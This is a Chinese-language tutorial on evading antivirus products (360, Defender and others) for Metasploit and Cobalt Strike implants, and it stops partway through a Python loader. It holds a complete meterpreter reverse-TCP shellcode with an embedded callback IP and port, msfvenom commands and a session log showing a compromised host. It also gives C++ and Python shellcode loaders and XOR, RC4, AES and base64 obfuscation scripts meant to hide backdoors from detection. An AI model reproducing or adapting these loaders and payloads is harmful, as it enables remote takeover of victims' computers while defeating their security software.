# 前置思路

```
#知识点：
1、ShellCode-分析&朔源&感知
2、ShellCode-混淆&编码&算法
3、回调执行解析-API&汇编&句柄

#章节点：
编译代码面-ShellCode-混淆
编译代码面-编辑执行器-编写
编译代码面-分离加载器-编写
程序文件面-特征码定位-修改
程序文件面-加壳花指令-资源
代码加载面-Dll反射劫持-加载
权限逻辑面-杀毒进程干扰-结束
工具数据面-通讯内存流量-动态

对抗目标：
X60 Defender 某绒 管家 VT等

编程语言：
C/C++  Python C# Go Powershell Ruby Java ASM等

涉及技术：
ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，
资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等
```

# 常见查杀方式

- 1、**特征码扫描**：所谓特征码其实就是程序内部的一串或者几串二进制机器码。特征码匹配工作原理是先总结出某个病毒的特征码，然后在目标文件中搜索看有没有类似的匹配，如果有匹配就暂定为病毒文件。优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，给用户带来麻烦。

- 2、**文件和校验法**：将正常文件A的hash值保存，然后如果有一个新的A文件发送过来计算其hash值，如果与正常文件的不同，那么认定为病毒文件。

- 3、**沙盒检测**：基于行为的检测，看有没有一些敏感的行为来确定文件是否为病毒。优点是可能发现未知的病毒，缺点是误报相对较高，需要用户参与。

- 4、**云查杀**：类似于特征码查杀。只是如果特征码库没有匹配值的时候会把文件上传到云端继续分析，有时候扫描病毒刚扫描出来不是病毒，但过一会儿扫描就是病毒了，这种行为就是云查杀。

# Day1

c/c++ 免杀

## shellcode编译上线

shellcode为一串16进制，对shellcode免杀比直接对exe文件免杀效果好，接下来用 c++ 编译运行 shellcode 为 exe 文件。然后执行上线

接下来看看 c++ 编译的代码：

```c++
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x49\x01"
"\xd0\x50\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x1a\x20\x2b\x8e\xff\x84\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";

int main()
    //以下为不同编译shellcode的代码

{  
	//((void(WINAPI*)(void))&buf)();
	
    //使用以下执行器要把文件名改为 .c
	char* Memory;
    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void(*)())Memory)();

    //__asm {
    //lea eax,buf
    //call eax
    //}
	
	//__asm{
	//mov eax, offset shellcode
	//_emit 0xFF
	//_emit 0xE0
	//}

}
```

可思考到，这里免杀一部分在于**直接混淆 shellcode** ，一部分在于**调用不同的加载shellcode的解析器代码**

### msf

msf 生成 shellcode：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=43.142.255.132 lport=6688 -f c
```

使用 `c` 来编译加载：

<img src=".\图片\Snipaste_2023-04-27_18-19-54.png" alt="Snipaste_2023-04-27_18-19-54" style="zoom:67%;" />

监听上线：

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 6688
lport => 6688
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:6688 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:6688 
[*] Sending stage (200774 bytes) to 60.217.189.244
[*] Meterpreter session 1 opened (10.0.4.8:6688 -> 60.217.189.244:50458) at 2023-04-27 18:16:46 +0800

meterpreter > getuid
Server username: WIN10-1\Administrator
```

### cs

与 msf 操作类似，便不演示了

### shellcode上线原理

当调用汇编执行shellcode时，把生成出来的exe文件载入到 `OllyDBG` 里，跟入可观察到 **msf服务器的ip与端口**（前提是没加壳，任何人都能逆向）

我们还可以查看 上线服务端 ip端口 为 6688，转为 16 进制 为 `\x1a\x20` 可在前面生成的 shellcode 里找到，同理 ip为 43.142.255.132 转化成 16 进制也可以在 shellcode 里找到 `x2b\x8e\xff\x84`

<img src=".\图片\Snipaste_2023-04-27_18-32-53.png" alt="Snipaste_2023-04-27_18-32-53" style="zoom:80%;" />

另外，假如我们只修改 shellcode 中 ip 与端口，那么也可以成功上线

## 沙盒分析

别人把我们生成的exe文件放在虚拟化环境中运行，就可能发现此类文件为后门（360的经典操作）

我们可以尝试**反沙盒反调试**，**不让别人在虚拟化环境运行或者使用 `OllyDBG` 逆向分析**

## 调用不常见执行器

项目 Callback_Shellcode_Injection

不对 shellcode 本身下手，只对执行器做文章，举其中一个例子：

```cpp
//#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include "Wingdi.h"

int main()
{ 
    char shellcode[] = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
        "\x45\x81\x3e\x43\x72\x65\x61\x75"
        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
        "\x6c\x63\x89\xe2\x52\x52\x53\x53"
        "\x53\x53\x53\x53\x52\x53\xff\xd7";

    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));
    EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW) hAlloc, NULL);

    printf("%d", GetLastError());
  
    VirtualFree(hAlloc,0, MEM_RELEASE);
}
```

这个方法单使用的话，效果不理想，可以配合 **shellcode 混淆** 一起做文章

## 混淆shellcode

Xor Aes Hex Rc4 Rsa等

工具项目：`https://github.com/Arno0x/ShellcodeWrapper`

### 1、XOR

#### 1.1 调用已有工具

生成 shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=43.142.255.132 lport=6688 -f raw > shellcode.raw
```

调用工具生成 cpp 代码，再编译生成解方案

```bash
python2 shellcode_encoder.py -cpp -cs -py shellcode.raw zf1yolo xor
```

#### 1.2 自写异或代码

异或编码 shellcode ：`python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin`

```python
import sys
from argparse import ArgumentParser, FileType

def process_bin(num, src_fp, dst_fp, dst_raw):
    shellcode = ''
    shellcode_size = 0
    shellcode_raw = b''
    try:
        while True:
            code = src_fp.read(1)
            if not code:
                break

            base10 = ord(code) ^ num
            base10_str = chr(base10)
            shellcode_raw += base10_str.encode()
            code_hex = hex(base10)
            code_hex = code_hex.replace('0x','')
            if(len(code_hex) == 1):
                code_hex = '0' + code_hex
            shellcode += '\\x' + code_hex
            shellcode_size += 1
        src_fp.close()
        dst_raw.write(shellcode_raw)
        dst_raw.close()
        dst_fp.write(shellcode)
        dst_fp.close()
        return shellcode_size
    except Exception as e:
        sys.stderr.writelines(str(e))

def main():
    parser = ArgumentParser(prog='Shellcode X', description='[XOR The Cobaltstrike PAYLOAD.BINs] \t > Author: 471656814@qq.com')
    parser.add_argument('-v','--version',nargs='?')
    parser.add_argument('-s','--src',help=u'source bin file',type=FileType('rb'), required=True)
    parser.add_argument('-d','--dst',help=u'destination shellcode file',type=FileType('w+'),required=True)
    parser.add_argument('-n','--num',help=u'Confused number',type=int, default=90)
    parser.add_argument('-r','--raw',help=u'output bin file', type=FileType('wb'), required=True)
    args = parser.parse_args()
    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)
    sys.stdout.writelines("[+]Shellcode Size : {} \n".format(shellcode_size))

if __name__ == "__main__":
    main()
```

把异或生成的 shellcode 替换 然后编译执行

```cpp
/*
Author: Arno0x0x, Twitter: @Arno0x0x
*/

#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char **argv) {

	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py
	char encryptedShellcode[] = "\xa1\xa3\xdf\x1f\x59\xff\xdb\xb0\x15\x4b\x90\x33\x53\xa0\xd0\x14\xe7\x83\x84\x58\x13\x7b\x67\x1b\x1c\xb6\x02\x11\x27\xaf\x80\xcc\xde\x2c\xd7\xb2\x56\x68\x8b\x7d\xfd\xb1\x1f\x0d\x2e\x6d\x6f\x01\xeb\x5e\x3c\x0f\x5e\xd9\xb0\xe1\x3e\x4f\x2f\x51\x0d\x16\x0f\x4f\xf5\x53\xec\x6e\x91\x03\x70\xd0\x1f\x61\xb6\xb1\x75\xd8\x80\xad\xa6\x1e\x3d\xb2\x2a\x9a\x00\x35\x07\x96\x8d\xb6\x00\x8c\x57\x6e\x3b\xae\x9f\x80\xc6\x7f\xac\xe9\x81\x0c\x7c\xff\x45\x94\x69\x4f\x16\x4d\xa0\x15\xef\xaa\x6d\x38\xe9\x02\xf3\x84\xbe\xb4\xfe\xd8\xc8\xd2\xb7\xfe\x07\x16\xe0\x83\x37\x6b\x6d\x80\xc0\xb3\x0d\x75\x60\x63\xfa\x83\x47\x56\x44\x73\xd6\x51\x28\xd1\x23\x7e\x87\x89\x87\xd9\x8f\x42\x0f\xf8\xa1\x5c\x50\x18\x47\x64\x71\x37\x87\xde\x49\xd3\x66\x26\x83\xf5\x21\x8e\x5a\x86\x64\xca\xe8\x64\x96\x41\x59\x78\x63\x85\x22\x0c\x4a\xd1\x82\x62\xba\x81\xcb\x03\x55\x0f\xd9\xd4\x7f\xb8\x5b\x8f\x86\x85\x56\x0b\x2e\x26\xe5\xe4\x90\x8c\x7b\xe2\xc7\x58\x2b\x7f\x52\x1c\x2f\xf5\xc5\xe2\xde\x51\x96\xaa\xd7\x2a\xac\xd8\x16\x0c\x1a\x77\x91\x17\x30\xb1\x7f\x34\x95\xb5\x61\x12\x7f\x96\x27\x7d\x26\x29\x71\x2d\xcb\x0d\x0f\x72\x8c\x27\xd7\xfb\xb3\x07\x6b\x92\x67\x2a\xc8\xcf\x16\x20\xca\xe0\xc5\xeb\xcb\x13\x23\x5d\x29\x7b\x90\x07\x23\x61\x34\x85\x7b\x6e\x56\xda\x9e\x70\x72\x42\x31\x24\x21\x76\xa7\x37\x46\x17\x62\x37\xe1\xad\x46\x49\x91\x86\x27\x53\x32\x2a\x63\x2a\x72\x57\x88\x60\x82\xd9\x9b\x02\x7e\x8c\x02\x91\x7c\x5f\xe7\x4c\xf2\x8d\x42\xea\x7b\x7e\x82\xe1\x58\x78\x80\xab\x1b\x3d\x2e\xdd\x17\xa9\x5f\x97\x1e\x12\xf3\xae\xe0\x58\x0d\xa3\xab\x65\x41\x26\x86\x31\x24\x7b\xb3\x14\xde\x54\x7a\xcb\x0c\xdd\xf7\x7b\xc4\x82\xfa\x35\x23\x10\x2f\x02\x22\x2f\x19\x2a\xe7\xe4\xb6\x2a\x02\x16\xf8\x7d\xb7\x2e\x95\xce\x99\x1d\xae\x6f\x14\x2b\xc7\x13\xf0\x9c\x9a\x6d\x98\x6a\x72\x0f\x46\x98\x14\x3c\x65\x36\x5c\x55\x88\x3c\x5a\xa3\x34\xe2\xbf\xd5\x95\xa8\x8f\x35\xf0\x6d\x92\x59\x34\x6e\xcd\x90\xaa\x0e\x43\x2a\x57\xc7\xc4\xba\xaf\xd6\x89\xac\x59\x99\x82\x8d\x27\xfa\xd1\x9c\xa0\x85\xe7\xea\xcb\xa3\xe3\xa4\xf5\x25\x10\x4c\xab\x10\xbd\xbf\xc4\x8d\x1d\xda\x52\x78\xc6\x10\x37\x91\x93\xba\x02\x54\xda\xd5\xe2\x8f\xd3\x46";
	char key[] = "xiaodi";
	char cipherType[] = "xor";

	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];	
	

	// XOR decoding stub using the key defined above must be the same as the encoding key
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;

		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}

	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	((void(*)())exec)();
}
```

#### 总结

对shellcode自写的编码加密比用工具好，网上现有的工具基本有指纹

### 2、AES

使用工具 ：`python2 shellcode_encoder.py -cpp -cs -py shellcode.raw zf1yolo aes`

### 3、Hex

生成 shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=43.142.255.132 lport=6688 -f c
```

在线编码加密（使用时注意细节）：

```http
https://gchq.github.io/CyberChef/
```

使用工具生成 exe 后门

```bash
LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)
```

### 4、Rc4

参考 https://blog.csdn.net/weixin_45590789/article/details/105536623

生成 shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=43.142.255.132 lport=6688 -f c
```

```cpp
#include <stdio.h>
#include <windows.h>
#include <iostream>
using namespace std;
unsigned char T[256] = { 0 };

int rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
	int i = 0, j = 0;
	
	unsigned char t[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++) {
		s[i] = i;
		t[i] = key[i % Len];
	}
	for (i = 0; i < 256; i++) {
		j = (j + s[i] + t[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	
	for (int i = 0; i < 256; i++)
	{
		T[i] = s[i];
		cout << "0x" << hex << (int)T[i] << ',';
	}
	cout << endl;
	return 0;
}

int rc4_crypt(unsigned char* s, unsigned char* buf, unsigned long Len)
{
	int i = 0, j = 0, t = 0;
	unsigned char tmp;
	for (int k = 0; k < Len; k++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		buf[k] ^= s[t];
	}
	return 0;
}
unsigned int main()
{
	char key[] = "reverse";
	unsigned char buf[] =
		"\x78\x50\xd3\x12\xbf\x13\x2a\xf2\x14\x15\x45\x59\x13\x25\xfe\x4c\x1d\x5e\x12\xfe\x7b\xb6\xbb\x47\xc3\x66\x53\xf7\x32\xdb\x8c\xe9\x4b\xdd\x8b\x59\xa1\x9a\x5a\xa0\xf4\x59\x53\xb0\x3c\x9f\x55\x0b\x2d\x1d\x91\xf0\xb3\x36\xa4\x33\x34\xdb\x79\xec\xeb\x92\xd6\xf2\xbc\x70\x58\xe7\x29\x11\x1c\x22\x62\xe5\x6f\x96\x18\x08\xf7\x86\x05\xb2\xc4\xab\x45\x21\xc6\xef\xf9\x9e\x34\x6b\x15\xbc\xf4\x96\x45\x62\x6e\xb2\xb5\x71\xa0\x7f\x26\x77\xe2\x5a\x89\x5a\x26\x03\xd1\x64\x89\x0e\x49\x89\x5a\x1e\x03\xd1\x89\x06\x89\x03\xd2\x8b\x46\x26\x26\x59\x59\x63\x5b\x58\x53\xfd\xe2\x5a\x5d\x58\x89\x10\xeb\x82\xfd\xfd\xfd\x5f\x6a\x31\x30\x02\x02\x6a\x75\x71\x30\x5d\x56\x6a\x4e\x75\x24\x05\x8b\xea\xfd\xd2\xba\x92\x03\x02\x02\x2b\xc6\x56\x52\x6a\x2b\x82\x69\x02\xfd\xd7\x68\x08\x6a\x2d\x5c\xee\x77\x6a\x00\x02\x18\x22\x8b\xe4\x52\x52\x52\x52\x42\x52\x42\x52\x6a\xe8\x0d\xdd\xe2\xfd\xd7\x95\x68\x12\x54\x55\x6a\x9b\xa7\x76\x63\xfd\xd7\x87\xc2\x76\x08\xfd\x4c\x0a\x77\xee\xea\x65\x02\x02\x02\x68\x02\x68\x06\x54\x55\x6a\x00\xdb\xca\x5d\xfd\xd7\x81\xfa\x02\x7c\x34\x89\x34\x68\x42\x6a\x02\x12\x02\x02\x54\x68\x02\x6a\x5a\xa6\x51\xe7\xfd\xd7\x91\x51\x68\x02\x54\x51\x55\x6a\x00\xdb\xca\x5d\xfd\xd7\x81\xfa\x02\x7f\x2a\x5a\x6a\x02\x42\x02\x02\x68\x02\x52\x6a\x09\x2d\x0d\x32\xfd\xd7\x55\x6a\x77\x6c\x4f\x63\xfd\xd7\x5c\x5c\xfd\x0e\x26\x0d\x87\x72\xfd\xfd\xfd\xeb\x99\xfd\xfd\xfd\x03\xc1\x2b\xc4\x77\xc3\xc1\xb9\xf2\xb7\xa0\x54\x68\x02\x51\xfd\xd7\x02";

	unsigned char s[256];
	rc4_init(s, (unsigned char*)key, strlen(key));
	for (size_t i = 0; i < sizeof(buf); i++)
	{
		rc4_crypt(s, &buf[i], sizeof(buf[i]));
		printf("\\x%02x", buf[i]);
	}
	LPVOID add =
	VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(add, buf, sizeof(buf));
	HANDLE handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)add, 0, 0, 0);
	WaitForSingleObject(handle, INFINITE);
	return 0;
}
```

### 总结

**现在比较好的方法是，自写对 shellcode 加密的函数，先把 shellcode 加密；然后在编译执行 shellcode 的 cpp 文件里放入加密后的 shellcode，用解密函数解密后 ，最后编译运行成 exe 后门文件**



# DAY2

python免杀

[奇安信攻防社区-python进行shellcode免杀 (butian.net)](https://forum.butian.net/index.php/share/1690)

## Python原生态执行Shellcode

先 cs 生成 shellcode，再把 shellcode 放入以下 python 代码直接运行便上线

```python
#coding=utf-8
#python的ctypes模块是内建，用来调用系统动态链接库函数的模块
#使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。
import ctypes

shellcode = bytearray(b"....................")

# 设置VirtualAlloc返回类型为ctypes.c_uint64
#在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

<img src=".\图片\Snipaste_2023-04-29_13-41-14.png" alt="Snipaste_2023-04-29_13-41-14" style="zoom:67%;" />

另外，补充下其它的运行shellcode的代码：

```python
执行代码1：
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
执行代码2：
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
ctypes.c_int(len(shellcode)),
ctypes.c_int(0x3000),
ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
buf,
ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_int(ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

## 混淆加密

这里的原理是，准备 2 个python脚本，一个测试版本使用各种加密算法加密 shellcoed，另一个把之前加密好的 shellcode 放在发布版本里使用对应的解密函数解密后再运行上线

### Base64初步探测

base64的实现比较简单，但是单独使用效果不怎么样，一般会与其他方法配合使用

测试脚本，base64编码shellcode并输出：

```python
import base64
shellcode= b'........'
print(base64.b64encode(shellcode))
```

发布版本，放入编码后的shellcode，并解码在运行：

```python
#coding=utf-8
#python的ctypes模块是内建，用来调用系统动态链接库函数的模块
#使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。
import base64
import ctypes

# base64编码后的shellcode，使用对应函数解码
shellcode =b'.............'
shellcode = base64.b64decode(shellcode)
shellcode = bytearray(shellcode)

# 以下是shellcode执行代码

# 设置VirtualAlloc返回类型为ctypes.c_uint64
#在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )
# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

### AES

BASE64+AES 配合混淆shellcode

测试加密脚本：

```python
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import ctypes,base64
# 如果text不足16位的倍数就用空格补足为16位
def add_to_16(text):
    if len(text.encode('utf-8')) % 16:
        add = 16 - (len(text.encode('utf-8')) % 16)
    else:
        add = 0
    text = text + ('\0' * add)
    return text.encode('utf-8')
# 加密函数
def encrypt(text):
    key = '9999999999999999'.encode('utf-8')
    mode = AES.MODE_CBC
    iv = b'qqqqqqqqqqqqqqqq'
    text = add_to_16(text)
    cryptos = AES.new(key, mode, iv)
    cipher_text = cryptos.encrypt(text)
    #print(base64.b64decode(cipher_text))
    # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串
    return b2a_hex(cipher_text)

if __name__ == '__main__':
    shellcode = b'..........'
    shellcode = base64.b64encode(shellcode).decode()
    shellcode = encrypt(shellcode)
    print(shellcode)
```

发布版本，放入已经生成加密后的shellcode：

```python
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import ctypes,base64

# AES解密函数，解密后，去掉补足的空格用strip() 去掉
def decrypt(text):
    key = '9999999999999999'.encode('utf-8')
    iv = b'qqqqqqqqqqqqqqqq'
    mode = AES.MODE_CBC
    cryptos = AES.new(key, mode, iv)
    plain_text = cryptos.decrypt(a2b_hex(text))
    shellcode=bytes.decode(plain_text).rstrip('\0')
    return shellcode

# 以下是shellcode执行代码
def run(shellcode):
  # 设置VirtualAlloc返回类型为ctypes.c_uint64
  #在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
  # 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
  ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )
  # 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
  buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
  ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
  )
  # 创建一个线程从shellcode放置位置首地址开始执行
  handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
  )
  # 等待上面创建的线程运行完
